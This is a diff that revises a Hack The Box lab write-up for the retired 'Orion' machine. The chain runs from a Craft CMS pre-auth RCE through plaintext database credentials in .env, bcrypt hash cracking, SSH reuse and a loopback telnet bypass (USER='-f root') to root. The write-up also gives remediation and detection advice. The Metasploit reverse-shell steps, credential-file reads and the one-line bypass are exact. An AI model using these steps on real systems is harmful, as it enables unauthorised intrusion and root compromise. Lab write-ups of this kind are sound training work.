@@ -1,5 +1,5 @@
 ---
-title: "Orion: Craft CMS pre-auth RCE to local telnet bypass"
+title: "Orion — Craft CMS Pre-Auth RCE and Loopback Telnet Authentication Bypass to Root"
 description: "Craft CMS pre-authentication RCE (CVE-2025-32432) and plaintext database credentials lead to an administrator hash and SSH access; a GNU inetutils telnet authentication bypass (CVE-2026-24061) on loopback yields root."
 type: case-study
 platform: Hack The Box
@@ -12,48 +12,87 @@ tags:
   - cms
   - credential-access
   - privesc
+objective: "Escalate from a pre-authentication CMS exploit to root through credential recovery and a legacy local-service authentication bypass."
+tools:
+  - rustscan
+  - feroxbuster
+  - metasploit
+  - mysql
+  - hashcat
+  - sshpass
+  - telnet
+skill: "Pre-authentication web exploitation and local privilege escalation through credential recovery"
+outcome: "Root via a loopback GNU inetutils telnet authentication bypass after recovering credentials from a pre-auth CMS exploit"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Target environment | Linux host running nginx and SSH; Craft CMS 5.6.16 |
+| Starting position | Unauthenticated network access |
+| Objective | Escalate from a pre-authentication CMS exploit to root through credential recovery and a legacy local-service authentication bypass |
+| Outcome | Root via a loopback GNU inetutils telnet authentication bypass |
 
 ## Summary
 
-Orion is a Hack The Box lab machine running SSH and an nginx web server fronting a Craft CMS 5.6.16 application. Enumeration identifies the CMS version and exposes an admin login endpoint. Exploitation relies on CVE-2025-32432, a pre-authentication remote code execution vulnerability in Craft CMS, to obtain a `www-data` shell. Post-exploitation credential discovery reveals plaintext MySQL credentials in the application environment file, and database access produces an admin bcrypt hash. Offline cracking recovers a password reused for SSH access. Local enumeration then reveals a telnet service bound to the loopback address, and the installed GNU inetutils version is vulnerable to CVE-2026-24061. Exploiting this authentication bypass through the USER environment variable yields root.
+Orion is a Hack The Box Linux lab that exposes SSH and an nginx-hosted Craft CMS 5.6.16 application. A pre-authentication remote code execution flaw in Craft CMS yields a `www-data` shell; the application environment file then discloses plaintext MySQL credentials, and the user table returns an administrator bcrypt hash. The hash is cracked offline to a password reused for SSH, and a telnet service bound to loopback running GNU inetutils 2.7 is abused through CVE-2026-24061 to reach root. Target and operator addresses, hostnames, wordlist paths, and credential material are replaced with role-based placeholders; command syntax is preserved.
 
-> This case study is based on a retired Hack The Box lab. Operator and target IPs, local hostnames, wordlist paths, and credential material have been replaced with role-based placeholders where needed.
+**Attack path:** **Unauthenticated web enumeration → Craft CMS 5.6.16 pre-auth RCE (CVE-2025-32432) → `www-data` shell → plaintext database credentials in the environment file → MySQL administrator hash → offline crack → SSH as a named user → loopback GNU inetutils telnet authentication bypass (CVE-2026-24061) → root**
 
 ## Context and Objective
 
-The objective is to document a supported lab walkthrough from initial enumeration through privilege escalation, preserving technical observation, command syntax, and evidentiary limitations. The lab environment provides an external-facing HTTP service on port 80 and SSH on port 22, with additional sensitive configuration and local services accessible only after initial access.
-
-Scope limitations relevant to the narrative include:
-
-- The exact enumeration wordlist used is not recorded in the source notes.
-- Generic tool names are used where the source did not record precise utility variants.
-- Application and operating system account passwords are redacted; the cracked password is shown only as a placeholder.
-- No active targeting, brute forcing, or unauthorized external testing is implied; all work occurred within an isolated lab.
+- **Target:** a Linux host exposing an nginx web tier and SSH.
+- **Exposed services:** SSH (22) and HTTP (80).
+- **Local setup:** the application hostname was mapped to the target in the operator's hosts file so the site resolved consistently.
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** move from an unauthenticated public service to user and root control, and demonstrate the impact of weak secret handling and a legacy local service.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### External enumeration
+### 1. Service Enumeration
 
-A fast TCP scan identified SSH and an nginx web server:
+Observation: a fast TCP scan enumerates open ports and service versions.
 
 ```bash
 mkdir nmap ; rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Orion-TCP
+```
+
+Truncated scan output:
+
+```text
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 ```
 
-The recorded output shows the web service redirected to a target hostname. The lab notes added that hostname to `/etc/hosts` to reach the application consistently:
+Significance: SSH is credential-gated, so the nginx web tier is the only unauthenticated attack surface.
+
+Result: two services are exposed, and the web tier becomes the entry point.
+
+### 2. Web Application Discovery
+
+Observation: the web service redirected to a hostname — a detail the source records without capturing output. Directory enumeration then exposed an admin login page.
 
 ```bash
-echo '<TARGET_IP> <TARGET_HOSTNAME>' | sudo tee -a /etc/hosts
+feroxbuster --url http://<TARGET_HOSTNAME> --wordlist <WEB_CONTENT_WORDLIST>
 ```
 
-Directory discovery then exposed an admin login page at `/admin/login`. The login page identified the platform as **Craft CMS 5.6.16**, and the notes associated that version with **CVE-2025-32432**.
+Discovery result and the login page fingerprint:
 
-### Pre-authentication remote code execution
+```text
+http://<TARGET_HOSTNAME>/admin/login
+Craft CMS 5.6.16
+CVE-2025-32432
+```
 
-Exploitation used a public pre-auth RCE path for the identified Craft CMS version. The recorded approach relied on an existing Metasploit module for **CVE-2025-32432**:
+Significance: the admin login endpoint and the exact CMS version identify a known pre-authentication remote code execution vulnerability.
+
+Result: an unauthenticated admin login page discloses a vulnerable CMS version.
+
+### 3. Pre-Authentication Remote Code Execution
+
+Observation: Craft CMS 5.6.16 is affected by CVE-2025-32432, and a public Metasploit module delivers the exploit.
 
 ```bash
 msfconsole
@@ -64,33 +103,53 @@ set lhost <ATTACKER_IP>
 exploit
 ```
 
-The recorded output shows the exploit returning an interactive shell as `www-data` on the web server. A TTY upgrade step was then used to stabilize the session:
+The exploit returned a shell as the web-service account, which was upgraded to a full TTY:
 
 ```bash
 script /dev/null -c /bin/bash
 ```
 
-This provided a persistent enough shell to continue post-exploitation from the application host.
-
-### Credential discovery in Craft CMS configuration
-
-Post-exploitation file review located the Craft CMS environment file. The recorded content included a database driver, host, service account, and plaintext database password. As required for public-safe writing, the specific secret values are omitted here.
-
-The command shown is representative only:
-
-```bash
-cat <CRAFT_CMS_ENVIRONMENT_FILE>
+```text
+www-data@<TARGET_HOSTNAME>:~$
 ```
 
-The technical significance is that Craft CMS stored active database credentials in a readable plaintext environment file, and the compromised web-service account had sufficient access to retrieve them.
+Significance: code execution is achieved without authentication in the context of the web service account.
 
-### MySQL database access and hash retrieval
+Result: a `www-data` shell on the application host.
 
-Using the discovered database credentials, the attacker accessed MySQL and enumerated available databases. The recorded output listed a target database named after the host application:
+### 4. Credential Discovery in the Application Environment File
+
+Observation: the Craft CMS environment file is readable and stores database credentials in plaintext.
+
+```bash
+cat /var/www/html/.env
+```
+
+Truncated file contents:
+
+```text
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=<DB_PASSWORD>
+```
+
+Significance: the application stores active database credentials in a readable plaintext file, so any file-read capability on the host yields them.
+
+Result: plaintext MySQL credentials are recovered from the application host.
+
+### 5. MySQL Administrator Hash Retrieval
+
+Observation: the database listens on loopback and the recovered credentials access it.
 
 ```bash
 mysql -u root -p'<DB_PASSWORD>'
 show databases;
+```
+
+Truncated database list:
+
+```text
 +--------------------+
 | Database           |
 +--------------------+
@@ -102,98 +161,113 @@ show databases;
 +--------------------+
 ```
 
-After selecting the application database, the attacker listed tables and queried the user store. The recorded query returned an administrator record including a bcrypt password hash:
+Querying the user store returns the administrator record and its password hash:
 
 ```sql
 use <APPLICATION_DATABASE>;
-show tables;
 select id, email, password from users\G
 ```
 
-The notes show one administrative account with an associated bcrypt hash. That credential artifact was then taken offline for cracking.
-
-### Hash cracking and SSH pivot
-
-The hash was cracked offline with the documented wordlist and mode selection. The source notes record a successful recovery, but the actual cleartext credential is omitted from this draft and replaced with a placeholder:
-
-```bash
-hashcat -m <BCRYPT_MODE> <HASH_FILE> <WORDLIST_PATH> -D2
-<CRACKED_PASSWORD>
+```text
+id: 1
+email: <SSH_USER>@<TARGET_HOSTNAME>
+password: <BCRYPT_HASH>
 ```
 
-The notes report that the recovered credential granted SSH access as a named host user. The command shown is representative only and uses placeholders:
+Significance: the user table stores bcrypt password hashes, and the administrator record is directly exposed.
+
+Result: an administrator account and its bcrypt hash are recovered.
+
+### 6. Hash Cracking and SSH Pivot
+
+Observation: the bcrypt hash is crackable offline.
 
 ```bash
-sshpass -p '<SSH_USER_PASSWORD>' ssh <SSH_USER>@<TARGET_HOSTNAME>
+hashcat -m 3200 <HASH_FILE> <WORDLIST_PATH> -D2
 ```
 
-This pivot is significant because it transitions access from the anonymous web service account to a named operating system account, expanding the local attack surface.
+```text
+:<CRACKED_PASSWORD>
+```
 
-### Local privilege escalation via telnet authentication bypass
+The recovered cleartext authenticates over SSH as the same named user:
 
-Once on the host as the SSH user, local service enumeration showed a telnet service bound only to the loopback interface. The recorded netstat output captured the listening address:
+```bash
+sshpass -p '<CRACKED_PASSWORD>' ssh <SSH_USER>@<TARGET_HOSTNAME>
+```
+
+```text
+<SSH_USER>@<TARGET_HOSTNAME>:~$
+```
+
+Significance: the credential reused across the application and the operating-system account turns a cracked hash into a usable system login.
+
+Result: authenticated SSH access as a named host user.
+
+### 7. Privilege Escalation via Loopback Telnet Authentication Bypass
+
+Observation: a telnet service listens only on loopback and the installed client identifies the affected version.
 
 ```bash
 netstat -tulnp
+```
+
+```text
 tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -
 ```
 
-The installed client version was confirmed as **GNU inetutils 2.7**:
-
 ```bash
 telnet --version
+```
+
+```text
 telnet (GNU inetutils) 2.7
 ```
 
-The source notes identify **CVE-2026-24061** as an authentication bypass related to the USER environment variable. In this lab configuration, that variable was interpreted in a way that allowed the attacker to request root-level execution when connecting to the local telnet service:
+GNU inetutils 2.7 is affected by CVE-2026-24061, an argument-injection flaw in which telnetd passes the `USER` environment variable to `login(1)` without sanitization. Setting `USER="-f root"` and requesting login (`-a`) bypasses authentication:
 
 ```bash
 export USER="-f root"
 telnet -a 127.0.0.1
+```
+
+```text
 root@<TARGET_HOSTNAME>:~#
 ```
 
-This final stage converted local user access into root, completing the privilege escalation path.
+Significance: a service reachable only from the local host converts a low-privileged local shell into root, so a loopback binding does not remove the risk.
+
+Result: a root shell is obtained through the telnet authentication bypass.
 
 ## Challenges and Decisions
 
-No failed attempts or complex remediation obstacles are recorded in the source notes for this machine. The attack path proceeds cleanly through four major stages:
-
-1. Pre-auth exploitation of the CMS.
-2. Credential discovery from application configuration.
-3. Offline hash cracking.
-4. Authentication bypass against a legacy local service.
-
-One decision worth noting is the SSH pivot rather than attempting further web-only post-exploitation. Moving to a named user account exposed the local telnet escalation route that would not have been reachable from the unauthenticated web-service context alone.
+No failed attempts or remediation obstacles are recorded in the source for this machine; access moved cleanly from unauthenticated web exploitation to a pre-auth shell, credential recovery, SSH access, and the local bypass. No tradeoffs or fixes are documented, so none are presented here.
 
 ## Outcome
 
-The evidence supports the following chain:
-
-- **CVE-2025-32432** provided an initial pre-auth shell as `www-data`.
-- Plaintext application credentials allowed MySQL access and administrator hash extraction.
-- Offline cracking produced a password reused for SSH.
-- **CVE-2026-24061** converted local access into root via a telnet authentication bypass.
-
-Limitations of the narrative:
-
-- Exact operator and target IPs are intentionally omitted.
-- The enumeration wordlist is not documented in the source notes.
-- The cracked password is shown only as a placeholder, not as a literal credential.
-- Technical descriptions of CVE behavior are limited to the lab-observed impact rather than full vulnerability analysis.
+Root access was obtained through a loopback telnet authentication bypass after a reused credential recovered from a pre-authentication CMS exploit provided SSH access to a named user. The bypass required an existing local shell, because the telnet service was bound to loopback.
 
 ## Lessons and Recommendations
 
-- **CMS patching is critical.** Pre-authentication RCE in a public-facing application can immediately compromise the entire web tier.
-- **Environment secrets must be restricted.** Plaintext credentials in `.env` or similar application files allow rapid credential escalation once a web-shell or file-read path exists.
-- **Password reuse across tiers amplifies risk.** A cracked application credential should not double as an operating system login.
-- **Loopback services are not safe by default.** Services bound to 127.0.0.1 still threaten local users, especially when legacy binaries are present.
-- **Software inventory matters.** The telnet escalation path depended on a vulnerable installed version of GNU inetutils, not on an externally exposed service.
+The actions below are recommendations; none was validated in the lab.
 
-Recommendations, distinct from what was tested here, include centralized secrets management, application credential isolation, version pinning with patch monitoring, and local service auditing even on non-internet-facing ports.
+1. **Unpatched public-facing CMS.** Craft CMS 5.6.16 is affected by a pre-authentication RCE, so the web tier is compromised before any authentication occurs. *Recommendation:* upgrade to a fixed release (5.6.17 or later; 4.14.15 and 3.9.15 for older branches) and track Craft CMS security advisories. *Detection:* monitor for anomalous requests to admin and application endpoints consistent with the exploit path.
+2. **Plaintext secrets in the application environment file.** The environment file stored active MySQL credentials in readable plaintext, enabling database access from any file-read path. *Recommendation:* move secrets into a managed secret store, restrict file permissions, and use least-privilege database accounts that the web user cannot read.
+3. **Password reuse across application and system tiers.** The administrator hash cracked to a cleartext password that also authenticated SSH, so one recovery bridged the application and operating-system boundaries. *Recommendation:* enforce unique credentials per account and prefer key-based SSH authentication with multi-factor access.
+4. **Legacy loopback telnet service.** The local telnet service running GNU inetutils 2.7 exposed CVE-2026-24061, an authentication bypass that grants root from a local shell. *Recommendation:* remove unnecessary legacy services, upgrade or replace inetutils with a patched version, and restrict the telnet port even on loopback. *Detection:* alert on unexpected inbound telnet connections and on processes invoking `login(1)` with an attacker-controlled `USER` value.
 
 ## References
 
-- Hack The Box — [Orion](https://app.hackthebox.com/machines/Orion)
-- CVE-2025-32432: pre-authentication RCE in Craft CMS
-- CVE-2026-24061: GNU inetutils telnet USER environment variable authentication bypass
+- [Hack The Box — Orion](https://app.hackthebox.com/machines/Orion) (retired machine)
+- [NVD — CVE-2025-32432](https://nvd.nist.gov/vuln/detail/CVE-2025-32432) (Craft CMS pre-authentication remote code execution)
+- [Craft CMS security advisory — GHSA-f3gw-9ww9-jmc3](https://github.com/craftcms/cms/security/advisories/GHSA-f3gw-9ww9-jmc3) (vendor advisory and patched versions)
+- [Craft CMS — CVE-2025-32432 guidance](https://craftcms.com/knowledge-base/craft-cms-cve-2025-32432) (vendor knowledge-base guidance)
+- [NVD — CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061) (GNU inetutils telnetd authentication bypass)
+- [GNU InetUtils security advisory — telnetd authentication bypass](https://lists.gnu.org/archive/html/bug-inetutils/2026-01/msg00004.html) (vendor advisory)
+- [GNU Inetutils manual — telnet invocation](https://www.gnu.org/software/inetutils/manual/html_node/telnet-invocation.html) (authoritative telnet client documentation)
+- [RustScan](https://github.com/RustScan/RustScan) (fast port scanning)
+- [feroxbuster](https://github.com/epi052/feroxbuster) (content discovery)
+- [Metasploit module — Craft CMS pre-auth RCE (CVE-2025-32432)](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/)
+- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery, including bcrypt mode 3200)
+- [MySQL Reference Manual — `mysql` command-line client](https://docs.oracle.com/cd/E17952_01/mysql-8.0-en/mysql.html) (authoritative client documentation)
+- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
